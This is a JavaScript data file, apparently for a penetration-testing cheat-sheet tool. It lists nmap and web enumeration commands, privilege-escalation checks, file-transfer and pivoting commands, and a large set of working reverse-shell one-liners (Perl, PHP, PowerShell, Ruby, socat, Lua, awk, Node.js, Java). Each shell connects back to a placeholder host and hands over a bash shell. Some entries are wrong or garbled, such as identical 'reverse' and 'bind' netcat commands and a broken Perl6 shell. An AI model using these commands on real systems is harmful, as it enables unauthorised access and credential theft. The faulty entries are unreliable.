var guide = {
    Enumeration: {
        "nmap": [
            {
                ID: "1",
                Title: "TCP SYN Port Scan",
                Command: "nmap -sS REMOTEIP",
                Description: "TCP Port scan remote host using the TCP SYN method."
            },
            {
                ID: "2",
                Title: "TCP Connect Port Scan",
                Command: "nmap -sT REMOTEIP",
                Description: "TCP Port scan remote host using the TCP Connect method."
            },
            {
                ID: "3",
                Title: "UDP Port Scan",
                Command: "nmap -sU REMOTEIP",
                Description: "UDP Port scan remote host."
            },
            {
                ID: "4",
                Title: "Port 445 Vuln Scan",
                Command: "nmap -Pn -p445 --script vuln REMOTEIP",
                Description: "Scan for vulnerabilities on Port 445."
            },
            {
                ID: 5,
                Title: "nmap",
                Command: "nmap -sC -sV -oA output_file_name REMOTEIP",
                Description: "Performs comprehensive port scanning, service version detection, and script scanning to gather information about open ports and running services on the target machine."
            }
        ],
        "enum4linux": [
            {
            ID: 6,
            Title: "enum4linux",
            Command: "enum4linux -a REMOTEIP",
            Description: "Enumerates information from Windows and Samba systems including user accounts, share names, group memberships, and more."
            }
        ],
        "Dirb": [
            {
            ID: 7,
            Title: "Dirb",
            Command: "dirb http://REMOTEIP/ -r -o output_file_name",
            Description: "Web content scanner that searches for hidden directories and files on web servers, useful for identifying potential entry points."
            }
        ],
        "Nikto": [
            {
            ID: 8,
            Title: "Nikto",
            Command: "nikto -h REMOTEIP",
            Description: "Performs comprehensive web server scanning, detecting potential vulnerabilities and misconfigurations on web servers."
            }
        ],
        "Gobuster": [
            {
            ID: 9,
            Title: "Gobuster",
            Command: "gobuster dir -u http://REMOTEIP/ -w wordlist.txt -t 50 -x php,html,txt",
            Description: "A tool used for directory and file brute-forcing, allowing you to discover hidden directories and files on web servers."
            }
        ],
        "enum": [
            {
            ID: 10,
            Title: "enum",
            Command: "enum target_domain",
            Description: "Enumerates information about a domain including DNS records, network configurations, and more, useful for reconnaissance in network penetration testing."
            }
        ],
        "SMBclient": [
            {
            ID: 11,
            Title: "SMBclient",
            Command: "smbclient -L REMOTEIP",
            Description: "Lists available shares on a remote SMB server, allowing for enumeration of file shares and potential access points."
            }
        ],
        "smpt-user-enum": [
            {
            ID: 12,
            Title: "SMTP user enumeration",
            Command: "smtp-user-enum -M VRFY -U users.txt -t REMOTEIP",
            Description: "Enumerates valid usernames on a mail server using the SMTP VRFY command, useful for identifying valid email accounts."
            }
        ],
        "SNMPwalk": [
            {
            ID: 13,
            Title: "SNMPwalk",
            Command: "snmpwalk -c public -v1 REMOTEIP",
            Description: "Walks through the Management Information Base (MIB) of SNMP-enabled devices, retrieving valuable information such as system configuration and network topology."
            }
        ],
        "WPScan": [
            {
            ID: 14,
            Title: "WPScan",
            Command: "wpscan --url http://REMOTEIP/ --enumerate u",
            Description: "WordPress vulnerability scanner that enumerates user accounts, useful for identifying potential points of entry on WordPress websites."
            }
        ] 
    },
    Shells: {
        "bash": [
          {
            "ID": 101,
            "Title": "Bash Shell",
            "Command": "bash -i",
            "Description": "Starts an interactive Bash shell on the target machine, allowing for command execution and interaction."
          }
        ],
        "python": [
          {
            "ID": 102,
            "Title": "Python Shell",
            "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "Description": "Spawns a pseudo-terminal (pty) and launches a Bash shell within a Python environment for enhanced interaction."
          }
        ],
        "netcat": [
          {
            "ID": 103,
            "Title": "Netcat Reverse Shell",
            "Command": "nc -nvlp local_port -e /bin/bash",
            "Description": "Sets up a listener on a local port and executes a Bash shell upon connection, useful for reverse shell connections."
          },
          {
            "ID": 104,
            "Title": "Netcat Bind Shell",
            "Command": "nc -nvlp local_port -e /bin/bash",
            "Description": "Listens on a local port and executes a Bash shell upon connection, useful for bind shell connections."
          }
        ],
        "perl": [
          {
            "ID": 105,
            "Title": "Perl Reverse Shell",
            "Command": "perl -e 'use Socket;$i=\"target_ip\";$p=target_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
            "Description": "Creates a reverse shell connection to the specified IP address and port using Perl, spawning a Bash shell upon successful connection."
          }
        ],
        "php": [
          {
            "ID": 106,
            "Title": "PHP Reverse Shell",
            "Command": "php -r '$sock=fsockopen(\"target_ip\",target_port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "Description": "Connects to the specified IP address and port and spawns a Bash shell using PHP, enabling command execution and interaction."
          }
        ],
        "ruby": [
          {
            "ID": 107,
            "Title": "Ruby Reverse Shell",
            "Command": "ruby -rsocket -e'f=TCPSocket.open(\"target_ip\",target_port).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Description": "Establishes a reverse shell connection to the specified IP address and port using Ruby, spawning a Bash shell upon connection."
          }
        ],
        "powershell": [
          {
            "ID": 108,
            "Title": "PowerShell Reverse Shell",
            "Command": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('target_ip',target_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "Description": "Initiates a reverse shell connection to the specified IP address and port using PowerShell, enabling command execution and interaction."
          }
        ],
        "socat": [
          {
            "ID": 109,
            "Title": "Socat Reverse Shell",
            "Command": "socat tcp-connect:target_ip:target_port exec:\"bash -i\",pty,stderr,setsid,sigint,sane",
            "Description": "Creates a reverse shell connection to the specified IP address and port using Socat, spawning a Bash shell upon connection."
          }
        ],
        "lua": [
          {
            "ID": 110,
            "Title": "Lua Reverse Shell",
            "Command": "lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"target_ip\",\"target_port\");os.execute(\"/bin/bash -i <&3 >&3 2>&3\");'",
            "Description": "Establishes a reverse shell connection to the specified IP address and port using Lua, spawning a Bash shell upon connection."
          }
        ],
        "telnet": [
          {
            "ID": 111,
            "Title": "Telnet Reverse Shell",
            "Command": "mkfifo /tmp/f; telnet target_ip target_port 0</tmp/f | /bin/bash 1>/tmp/f",
            "Description": "Creates a named pipe (FIFO) and establishes a reverse shell connection using Telnet, spawning a Bash shell upon connection."
          }
        ],
        "awk": [
          {
            "ID": 112,
            "Title": "Awk Reverse Shell",
            "Command": "awk 'BEGIN {s = \"/inet/tcp/0/target_ip/target_port\"; while(42) { do{ printf \"shell&gt; \"; } while ((s |& getline cmd) &lt;= 0); if (cmd) while (cmd |& getline line) print line |& s; close(cmd); } close(s); }'",
            "Description": "Creates a reverse shell connection to the specified IP address and port using Awk, spawning a Bash shell upon connection."
          }
        ],
        "nodejs": [
          {
            "ID": 113,
            "Title": "Node.js Reverse Shell",
            "Command": "node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\"); var client = new net.Socket(); client.connect(target_port, \"target_ip\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'",
            "Description": "Establishes a reverse shell connection to the specified IP address and port using Node.js, spawning a Bash shell upon connection."
          }
        ],
        "java": [
          {
            "ID": 114,
            "Title": "Java Reverse Shell",
            "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/target_ip/target_port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
            "Description": "Creates a reverse shell connection to the specified IP address and port using Java, spawning a Bash shell upon connection."
          }
        ],
        "perl6": [
          {
            "ID": 115,
            "Title": "Perl6 Reverse Shell",
            "Command": "perl6 -e 'use v6.d.Prelude;use v6;my \$ip=\"target_ip\";my \$port=target_port;my \$s=IO::Socket::INET.new(:\$ip,:\$port,:listen);my \$c=\$s.accept;my \$t=Proc::Async.new(:out,\$c,:$*OUT);\$t.start;my \&p= \$*IN.slurp-rest;start \$*OUT.=get.put while \$c.gist\ne!=\$c.close;'",
            "Description": "Establishes a reverse shell connection to the specified IP address and port using Perl6, spawning a Bash shell upon connection."
          }
        ],
        "sh": [
          {
            "ID": 116,
            "Title": "Sh Reverse Shell",
            "Command": "/bin/sh -i",
            "Description": "Starts an interactive Shell on the target machine, allowing for command execution and interaction."
          }
        ]
      }
      ,
    "Privilege Escalation": {
        "sudo": [
            {
            "ID": 201,
            "Title": "Sudo Without Password",
            "Command": "sudo -l",
            "Description": "Check current user's sudo privileges to identify commands that can be executed without providing a password."
            }
        ],
        "kernel": [
        ],
        "SUID": [
            {
            "ID": 203,
            "Title": "SUID Binaries",
            "Command": "find / -perm -u=s -type f 2>/dev/null",
            "Description": "List SUID (Set User ID) binaries on the system, which may allow executing commands with elevated privileges."
            }
        ],
        "cron": [
            {
            "ID": 204,
            "Title": "Cron Jobs",
            "Command": "crontab -l",
            "Description": "Display cron jobs scheduled for the current user, identifying any running as other users or with elevated privileges, which may lead to privilege escalation."
            }
        ],
        "path": [
            {
            "ID": 205,
            "Title": "Path Variable",
            "Command": "echo $PATH",
            "Description": "Display current user's PATH environment variable, which may contain directories where custom binaries with elevated privileges are located."
            }
        ],
        "sudoers": [
            {
            "ID": 206,
            "Title": "Sudoers File",
            "Command": "sudo cat /etc/sudoers",
            "Description": "Display contents of the sudoers file, which defines sudo permissions for users and groups."
            }
        ],
        "services": [
            {
            "ID": 207,
            "Title": "Services Configuration",
            "Command": "ls -l /etc/init.d/",
            "Description": "List service configurations to identify misconfigurations or vulnerabilities that may allow privilege escalation, such as insecure file permissions or outdated software versions."
            }
        ],
        "capabilities": [
            {
            "ID": 208,
            "Title": "Capabilities",
            "Command": "getcap -r / 2>/dev/null",
            "Description": "List file capabilities set on executables, which may allow processes to perform privileged operations without running with elevated privileges."
            }
        ],
        "passwords": [
            {
            "ID": 209,
            "Title": "Stored Passwords",
            "Command": "grep -rnw '/' -ie 'password' --color=always 2>/dev/null | grep -v '/proc/' | grep -v '/usr/share/'",
            "Description": "Search for files containing stored passwords or credentials, such as configuration files or database dumps, which may provide access to privileged accounts."
            }
        ],
        "bash": [
            {
            "ID": 210,
            "Title": "Bash History",
            "Command": "cat ~/.bash_history",
            "Description": "Display contents of the current user's Bash history file, which may contain commands or credentials useful for privilege escalation."
            }
        ]
    },
    "File Transfers": {
        "wget": [
            {
            "ID": 301,
            "Title": "Wget",
            "Command": "wget http://example.com/file.txt",
            "Description": "Download a file from a web server using HTTP or HTTPS protocol."
            }
        ],
        "curl": [
            {
            "ID": 302,
            "Title": "Curl",
            "Command": "curl -O http://example.com/file.txt",
            "Description": "Download a file from a web server using HTTP or HTTPS protocol."
            },
            {
            "ID": 303,
            "Title": "Curl (FTP)",
            "Command": "curl -O ftp://example.com/file.txt --user username:password",
            "Description": "Download a file from an FTP server using FTP protocol, providing authentication credentials if required."
            }
        ],
        "scp": [
            {
            "ID": 304,
            "Title": "SCP",
            "Command": "scp user@REMOTEIP:/path/to/file.txt /local/path/",
            "Description": "Securely copy files between a local and a remote host over SSH protocol."
            }
        ],
        "ftp": [
            {
            "ID": 305,
            "Title": "FTP",
            "Command": "ftp",
            "Description": "Interact with a remote FTP server to upload or download files."
            }
        ],
        "sftp": [
            {
            "ID": 306,
            "Title": "SFTP",
            "Command": "sftp user@REMOTEIP",
            "Description": "Interact with a remote server over SSH to securely transfer files."
            }
        ],
        "nc": [
            {
            "ID": 307,
            "Title": "Netcat",
            "Command": "nc -nlvp local_port > received_file",
            "Description": "Listen for an incoming file transfer using Netcat."
            },
            {
            "ID": 308,
            "Title": "Netcat (Send)",
            "Command": "nc REMOTEIP remote_port < file_to_send",
            "Description": "Send a file to a remote host using Netcat."
            }
        ],
        "rsync": [
            {
            "ID": 309,
            "Title": "Rsync",
            "Command": "rsync -avz /local/path/ user@REMOTEIP:/remote/path/",
            "Description": "Sync files and directories between a local and a remote host over SSH."
            }
        ],
        "tftp": [
            {
            "ID": 310,
            "Title": "TFTP",
            "Command": "tftp",
            "Description": "Interact with a remote TFTP server to upload or download files."
            }
        ]
    },
    Pivot: {
        "ssh_tunnel": [
            {
            "ID": 401,
            "Title": "SSH Tunnel",
            "Command": "ssh -L local_port:REMOTEIP:target_port user@proxy_host",
            "Description": "Establish an SSH tunnel through a proxy server to access services on a target host."
            }
        ],
        "proxychains": [
            {
            "ID": 402,
            "Title": "Proxychains",
            "Command": "proxychains nmap -sT -Pn REMOTEIP",
            "Description": "Run network tools such as Nmap through a proxy server using Proxychains."
            }
        ],
        "socat": [
            {
            "ID": 403,
            "Title": "Socat Proxy",
            "Command": "socat tcp-listen:local_port,fork tcp:REMOTEIP:target_port",
            "Description": "Set up a TCP proxy using Socat, allowing connections to a target host via a local port."
            }
        ],
        "sshuttle": [
            {
            "ID": 404,
            "Title": "SSHuttle",
            "Command": "sshuttle -r user@proxy_host target_subnet",
            "Description": "Transparently forward connections through an SSH tunnel using SSHuttle, useful for accessing multiple hosts within a subnet."
            }
        ],
        "proxychains-ng": [
            {
            "ID": 405,
            "Title": "Proxychains-ng",
            "Command": "proxychains4 -f proxychains.conf command_to_run",
            "Description": "Run commands through a proxy server using Proxychains-ng with custom configuration."
            }
        ],
        "chisel": [
            {
            "ID": 406,
            "Title": "Chisel",
            "Command": "chisel client proxy_host:proxy_port R:REMOTEIP:target_port",
            "Description": "Create a TCP tunnel through a proxy server using Chisel, enabling access to services on a target host."
            }
        ],
        "havij": [
            {
            "ID": 407,
            "Title": "Havij",
            "Command": "Havij -connectproxy proxy_host:proxy_port -url 'http://REMOTEIP/vuln.php?id=1'",
            "Description": "Use Havij SQL Injection tool with a proxy to intercept and analyze traffic between the tool and the target web server."
            }
        ],
        "dnscat2": [
            {
            "ID": 408,
            "Title": "Dnscat2",
            "Command": "dnscat2 -dns domain_name",
            "Description": "Use DNS tunneling with Dnscat2 to bypass firewalls and proxy restrictions."
            }
        ]  
    }
};

